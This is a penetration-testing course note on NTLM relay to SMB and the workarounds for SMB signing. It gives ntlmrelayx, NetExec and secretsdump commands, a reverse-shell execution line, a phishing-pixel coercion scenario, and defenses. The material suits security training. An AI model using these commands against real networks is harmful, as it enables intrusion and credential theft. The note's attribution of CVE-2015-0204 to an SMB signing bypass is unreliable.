---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.08 NTLM Relay to SMB"
---

# 08 - NTLM Relay to SMB - SMB Signing Bypasses

## 1. Introduction to NTLM Relay to SMB

NTLM Relaying to SMB is the classic form of the NTLM relay attack. Server Message Block (SMB) is the backbone of Windows file sharing, remote administration, and IPC (Inter-Process Communication). When an attacker successfully relays an NTLM authentication to the SMB service of a target machine, they gain access to that machine in the context of the relayed user. 

If the relayed user holds local administrative privileges on the target machine, the attacker can execute arbitrary commands, dump credentials (SAM/LSA), move laterally, and install persistence mechanisms.

Historically, this was trivially easy across all Windows networks. However, modern Windows environments introduce **SMB Signing**, which significantly restricts an attacker's ability to relay NTLM to SMB endpoints.

## 2. Architectural Flow & ASCII Diagram

```text
  +-----------------------+                            +-----------------------+
  |    Victim Client      |                            |     Target Server     |
  | (e.g., Workstation 1) |                            |  (e.g., Workstation 2)|
  +-----------+-----------+                            +-----------+-----------+
              |                                                    ^
              | 1. Attacker Coerces Auth                           |
              |    (LLMNR/NBT-NS Poisoning, Coercer)               |
              V                                                    |
  +-----------+-----------+                                        |
  |    Attacker Node      |  3. Relays NTLM messages to SMB        |
  |  (impacket-smbrelayx) |========================================+
  +-----------+-----------+                                        |
              ^                                                    |
              | 2. Victim sends NTLM Negotiate                     |
              |    (SMB or HTTP)                                   |
              |                                                    |
              |                                                    |
              | 4. Attacker gains Local Admin access on Target     |
              |    - Dump SAM hashes                               |
              |    - Execute commands via Service Control Manager  |
              |    - Extract LSA Secrets                           |
              +----------------------------------------------------+
```

## 3. The SMB Signing Mechanism

To understand how to bypass or work around SMB restrictions, one must first understand how SMB Signing works.

SMB Signing is a security mechanism where each SMB packet is digitally signed at the MAC (Message Authentication Code) level.
- During the NTLM authentication phase, a cryptographic **Session Key** is generated.
- The client and the server use this Session Key to sign the SMB packets.
- In a relay attack, the attacker acts as a middleman. Because the attacker does not know the victim's password, the attacker **cannot calculate the Session Key**.
- If the target server requires SMB Signing, the attacker cannot sign the subsequent post-authentication SMB packets. The server will reject the packets, and the attack fails.

### 3.1. SMB Signing States
SMB Signing is controlled by registry keys and GPOs, and has three general states:
1. **Disabled:** Signing is not supported (rare in modern Windows).
2. **Enabled (but not required):** The machine supports signing if the client requests it, but does not mandate it. This is the **default for Windows Workstations and Member Servers**.
3. **Required:** The machine strictly requires signing. If the client cannot sign packets, the connection is dropped. This is the **default for Domain Controllers**.

## 4. Bypasses and Exploitation Vectors

If a target has "SMB Signing Required" enabled, you cannot directly relay NTLM to its SMB service. However, there are numerous workarounds, lateral movement strategies, and downgrade attacks that pentesters employ.

### 4.1. Targeting Workstations and Member Servers
Because SMB Signing is **Enabled but not Required** by default on Windows 10/11 Workstations and standard Windows Servers (IIS, SQL, File Servers), these machines are inherently vulnerable to SMB relaying.
- The attacker intercepts an authentication request.
- The attacker modifies the NTLM negotiation flags in the packet to tell the server "I do not support SMB signing".
- Since the server does not *require* it, it accepts the unsigned connection.
- The attacker dumps the SAM database of the target server.

*Practical Execution with `ntlmrelayx`:*
```bash
# Dump SAM hashes on targets listed in targets.txt
ntlmrelayx.py -tf targets.txt -smb2support

# Execute a reverse shell command
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell.exe -e <BASE64_PAYLOAD>'
```

### 4.2. Cross-Protocol Relaying (HTTP to SMB)
If the attacker manages to capture NTLM authentication over HTTP (e.g., via WPAD poisoning or coercing the victim to visit an HTTP share `http://attacker/`), the relay to SMB is highly effective.
- HTTP does not implement signing.
- When the client authenticates via HTTP, the resulting NTLM type messages are perfectly clean and can be repackaged by the attacker and fired at the target's SMB service.

### 4.3. CVE-2015-0204 (SMBSign Bypass / "Ghost" Bugs)
Historically, there were explicit bypasses for SMB Signing, such as vulnerabilities where modifying certain bits in the SMB header would crash the signing enforcement logic on the server, forcing it to accept unsigned packets. While patched over a decade ago, legacy SCADA or old Windows Server 2003/2008 R2 unpatched systems might still be susceptible.

### 4.4. Targeting Non-Windows Appliances
Many network appliances—such as NAS drives, Linux-based Samba servers, backup appliances, and hypervisor management interfaces—integrate with Active Directory for authentication but fail to enforce SMB Signing properly. Relaying a DA credential to a vulnerable NAS can often yield access to sensitive enterprise backups.

### 4.5. Relaying Machine Accounts
It is a common misconception that you cannot relay a machine account (e.g., `WKSTN1$`) to SMB. While you cannot relay a machine account back to itself over SMB (due to Microsoft patching the MS08-068 vulnerability), you **can** relay a machine account to a *different* machine, provided the machine account has administrative privileges on the target. This is common in SCCM or vulnerability scanner architectures where certain computer accounts are placed in the Local Administrators group of other machines.

## 5. Identifying Vulnerable Targets

Before launching a relay attack, an attacker must map out which machines do not require SMB signing.
Using `CrackMapExec` or `NetExec`:
```bash
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```
The output explicitly flags `(signing:False)` for vulnerable endpoints, and the generated `targets.txt` can be fed directly into `ntlmrelayx`.

Using Nmap:
```bash
nmap -p445 --script smb-security-mode 192.168.1.0/24
```
Look for: `Message signing enabled but not required`.

## 6. Advanced Execution: SOCKS Proxying

Instead of just running a single command or dumping the SAM, an attacker can use `ntlmrelayx` to establish a SOCKS proxy into the relayed session. This is immensely powerful as it allows the attacker to route native tools through the authenticated SMB session.

```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```
When a victim authenticates:
1. `ntlmrelayx` intercepts and relays it.
2. The session is parked, and a SOCKS4/5 port (typically 1080) opens on the attacker's machine.
3. The attacker configures `proxychains`.
4. The attacker can now run `smbclient`, `crackmapexec`, or `secretsdump` directly through the proxy using the relayed session.
```bash
proxychains secretsdump.py -no-pass INTRANET/VICTIM_USER@192.168.1.50
```

## 7. Defenses and Mitigations

Defending against SMB relaying requires a defense-in-depth approach.

1. **Require SMB Signing Globally:** 
   Enable the GPO: `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Microsoft network server: Digitally sign communications (always)`.
   *Note:* This may impact performance (slightly) and break legacy appliances that do not support signing.
2. **Disable LLMNR and NBT-NS:** Stop the broadcast protocols that attackers use to poison name resolution and capture the initial SMB/HTTP authentication.
3. **Require SMBv3:** SMBv3 includes better encryption and security features out of the box. Disable SMBv1 and SMBv2 if possible.
4. **Tiered Administration:** Ensure Domain Admins do not log into standard workstations. Even if a workstation is compromised via SMB relay, the credential exposed will only be a lower-tiered account.
5. **Account Protections:** Use "Protected Users" security group in AD for highly sensitive accounts to restrict NTLM authentication entirely.

## Real-World Attack Scenario

In a recent assessment of a corporate network, an attacker obtained network access but lacked valid domain credentials. Initial reconnaissance using `NetExec` revealed that while Domain Controllers enforced SMB Signing, over 200 standard Windows 10 workstations and several internal application servers had SMB Signing set to "Enabled but not required" (the default configuration).

```bash
nxc smb 10.20.30.0/24 --gen-relay-list vulnerable_smb.txt
```

The attacker launched `ntlmrelayx.py`, feeding it the list of vulnerable targets and configuring it to establish a SOCKS proxy for any successful relay:
```bash
impacket-ntlmrelayx -tf vulnerable_smb.txt -smb2support -socks
```

To coerce authentication, the attacker crafted a highly targeted phishing email to the IT Support team. The email contained an invisible 1x1 pixel image pointing to a UNC path hosted on the attacker's machine (`\\10.20.30.50\logo.png`). When a Tier-2 IT Support administrator opened the email in an older desktop email client, their machine automatically attempted to authenticate to the attacker's SMB server using their privileged credentials.

`ntlmrelayx` caught the incoming NTLM handshake and reflected it against multiple targets in `vulnerable_smb.txt`. Because the IT administrator's account belonged to the "Workstation Admins" group, the relay succeeded against five different workstations. `ntlmrelayx` held these authenticated SMB sessions open and exposed them via a local SOCKS4 proxy on port 1080.

The attacker then routed their tools through the proxy using `proxychains`. They targeted one of the relayed sessions (`WKSTN-105`) to dump the local SAM database:
```bash
proxychains impacket-secretsdump -no-pass INTRANET/IT_Admin@10.20.30.105
```

The extraction revealed that the local `Administrator` account shared the same password hash across the entire subnet (a violation of LAPS best practices). The attacker used this reused local administrator hash in a Pass-the-Hash attack to pivot laterally to a critical Database Server, bypassing the need to crack the IT Administrator's password entirely.

## 8. Chaining Opportunities
- [[06 - Coercer - The Universal Coercion Toolkit]] – Use Coercer to force high-privilege users or machine accounts to authenticate to your NTLM relay listener.
- [[01 - LLMNR and NBT-NS Poisoning Responder]] – The most common method of obtaining the initial incoming authentication.
- [[13 - SecretsDump and LSA Extraction]] – The immediate post-exploitation action after a successful SMB relay.

## 9. Related Notes
- [[04 - SMB Signing Mechanics]]
- [[02 - NTLM Authentication Deep Dive]]
- [[17 - Pass-the-Hash Attacks]]
- [[18 - MS08-068 NTLM Reflection]]

## 10. Understanding the NTLMSSP Exchange in SMB

When an NTLM relay to SMB occurs, the tool must cleanly intercept and forward the NTLM Security Support Provider (NTLMSSP) structures encapsulated within the SMB Session Setup Request.

1. **SMB Negotiate Protocol Request:** The victim connects to the attacker and negotiates the SMB dialect (SMB1, SMB2, SMB3).
2. **SMB Session Setup Request (Type 1):** The victim sends the `NTLM_NEGOTIATE` message. The attacker holds this, opens a connection to the target server, and forwards this Type 1 message.
3. **SMB Session Setup Response (Type 2):** The target server responds to the attacker with an `NTLM_CHALLENGE` containing the server's challenge (a random 8-byte nonce). The attacker forwards this back to the victim.
4. **SMB Session Setup Request (Type 3):** The victim uses their password hash and the challenge to calculate the `NTLM_AUTHENTICATE` message. They send this to the attacker. The attacker forwards this to the target server.
5. **SMB Session Setup Response (Success):** The target server accepts the authentication. 

At this point, the attacker's TCP connection to the target server is considered an authenticated SMB session. The victim's connection to the attacker is typically dropped or parked, but the attacker retains the active connection to the target.

## 11. Multi-Relay Strategies

Standard `ntlmrelayx` usage relays a single authentication to a single target. However, in large environments, an attacker might want to spray that authentication across an entire subnet to find where the relayed user has local admin rights.

**The limitation:** NTLM challenges are unique. A single Type 3 response is only valid for the specific Type 2 challenge that generated it. Therefore, an attacker cannot simply duplicate a Type 3 message and send it to 50 different servers.

**The solution: Multi-Relaying (or Challenge Reflection)**
Tools like `MultiRelay.py` (part of Responder) or advanced configurations of `ntlmrelayx` handle this by:
1. Opening connections to multiple targets simultaneously.
2. Collecting all the different Type 2 challenges from the targets.
3. If the attacker coerces multiple authentications from the victim (e.g., by coercing the victim multiple times in rapid succession or intercepting multiple LLMNR requests), the attacker maps each incoming authentication to a different target's challenge.
4. This allows the attacker to execute commands on multiple hosts using the same victim account, overcoming the single-challenge limitation.

## 12. Evasion and Detection Artifacts

When executing SMB Relay attacks, specific artifacts are left in the Windows Event Logs of the target system:
- **Event ID 4624 (Logon):** A successful logon will be recorded on the target server. Crucially, the `Source Network Address` will be the **Attacker's IP**, not the Victim's IP. This is a primary detection metric: "User X authenticated from an IP address they do not normally use."
- **Event ID 4625 (Failed Logon):** If the relay fails (e.g., due to SMB signing), a failed logon is logged.
- **Service Control Manager (Event ID 7045):** If `ntlmrelayx` is used to execute a command (e.g., via `-c`), it typically does so by creating and starting a temporary Windows Service. The creation of services with random 8-character alphanumeric names (like `BTOaGj1x`) is a massive red flag and easily detected by modern EDRs.

To evade detection, attackers utilizing SOCKS proxying can avoid service creation entirely, instead interacting with the file system (`\C$`) directly or using more stealthy execution mechanisms like WMI (`wmiexec.py` routed through the SOCKS proxy), though WMI also leaves its own artifacts.

## 13. Practical Limitations and Troubleshooting

While NTLM relaying to SMB is conceptually straightforward, numerous environmental factors can cause execution failures during an engagement:

1. **Network Firewalls (Host-Based):**
   Even if SMB Signing is not required, the target's Windows Defender Firewall might block inbound SMB traffic (port 445) from other workstations. A typical workstation profile only allows inbound SMB from authorized management subnets, blocking attacker subnets.
2. **Account Privileges:**
   The coerced account must have Local Administrator privileges on the target machine. Standard domain users generally cannot be relayed to gain code execution unless they have been over-privileged.
3. **UAC Remote Restrictions:**
   If the relayed account is a Local Administrator (but not the RID 500 built-in Administrator account) and is not part of the Domain Admins group, UAC Remote Restrictions (`LocalAccountTokenFilterPolicy`) may prevent administrative access over the network, effectively blocking code execution despite a successful relay.
